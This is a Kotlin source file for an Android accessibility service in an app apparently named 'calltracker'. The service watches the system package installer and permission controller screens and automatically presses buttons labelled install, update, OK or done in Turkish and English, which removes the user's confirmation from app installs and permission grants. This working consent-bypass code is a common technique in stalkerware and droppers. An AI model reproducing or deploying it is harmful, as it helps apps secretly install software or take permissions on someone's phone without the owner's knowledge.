package com.mehmetdogru.calltracker

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class AutoInstallAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "AutoInstallAccess"
        private val TARGET_PACKAGES = setOf(
            "com.android.packageinstaller",
            "com.google.android.packageinstaller",
            "com.android.permissioncontroller"
        )
        private val CLICKABLE_KEYWORDS = listOf(
            "yükle", "güncelle", "install", "update", "tamam", "bitti", "done"
        )
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val pkgName = event.packageName?.toString() ?: ""
        if (!TARGET_PACKAGES.contains(pkgName)) return

        val rootNode = rootInActiveWindow ?: return

        try {
            findAndClickButton(rootNode)
        } catch (e: Exception) {
            Log.e(TAG, "Otomatik tıklama hatası: ${e.message}")
        }
    }

    private fun findAndClickButton(node: AccessibilityNodeInfo): Boolean {
        val text = node.text?.toString()?.lowercase() ?: ""
        val desc = node.contentDescription?.toString()?.lowercase() ?: ""

        for (kw in CLICKABLE_KEYWORDS) {
            if (text == kw || desc == kw) {
                if (node.isClickable) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    Log.d(TAG, "🤖 Otomatik Kurulum Butonuna Tıklandı: '$text'")
                    return true
                } else if (node.parent?.isClickable == true) {
                    node.parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    Log.d(TAG, "🤖 Otomatik Kurulum Butonuna Tıklandı (Parent): '$text'")
                    return true
                }
            }
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            if (findAndClickButton(child)) return true
        }

        return false
    }

    override fun onInterrupt() {
        Log.d(TAG, "Accessibility service interrupted")
    }
}
